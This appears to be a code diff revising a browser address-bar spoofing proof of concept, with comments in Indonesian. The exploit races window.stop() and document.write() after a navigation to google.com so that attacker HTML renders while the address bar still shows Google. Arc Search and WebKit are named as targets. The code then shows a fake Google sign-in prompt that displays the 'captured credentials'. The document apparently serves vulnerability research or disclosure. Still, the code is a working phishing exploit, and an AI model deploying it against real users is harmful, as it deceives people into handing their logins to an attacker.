@@ -33,27 +33,43 @@
 
   <script>
     function executeSpoof() {
-      // 1. Ubah tampilan halaman lokal menjadi halaman buatan Anda
-      document.getElementById('main').innerHTML = `
-        <h1 style="color: red;">This is not Google.</h1>
-        <p>This is a custom attacker page running under spoofed UI context.</p>
-      `;
+      // 1. Eksekusi navigasi ke target domain pada frame utama
+      let win = window.open('https://www.google.com/about/', '_self');
 
-      // 2. Picu navigasi ke domain target
-      location.href = 'https://www.google.com:8888';
-
-      // 3. Hentikan pemuatan halaman asli tepat setelah address bar diperbarui oleh browser
+      // 2. Tembakkan penulisan ulang dokumen sebelum context teardown selesai di WebKit
       setTimeout(() => {
-        window.stop(); // Menghentikan navigasi agar halaman asli Google tidak merender
+        try {
+          // Hentikan proses pemuatan halaman asli Google
+          window.stop();
 
-        // Picu prompt otomatis
-        setTimeout(() => {
-          let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
-          if (user) {
-            alert('Captured Credentials: ' + user);
-          }
-        }, 50);
-      }, 10); // Sesuaikan timing interval (10ms - 100ms) untuk menentukan titik kompromi Arc Search
+          // Timpa seluruh isi dokumen dengan konten buatan penyerang
+          document.open();
+          document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Spoofed Page</title></head>
+            <body style="display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; font-family:sans-serif; background-color:#fff;">
+              <div style="text-align:center; padding:20px;">
+                <h1 style="color: red; font-size: 28px;">This is not Google.</h1>
+                <p style="color: #333;">This custom HTML is rendered while the address bar displays google.com.</p>
+              </div>
+            </body>
+            </html>
+          `);
+          document.close();
+
+          // 3. Picu prompt opsional di atas halaman palsu tersebut
+          setTimeout(() => {
+            let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
+            if (user) {
+              alert('Captured Credentials: ' + user);
+            }
+          }, 100);
+
+        } catch (e) {
+          console.warn("Cross-origin or frame access blocked:", e);
+        }
+      }, 0); // Jeda 0ms-20ms untuk mengeksploitasi pemicuan event loop WebKit
     }
   </script>
 
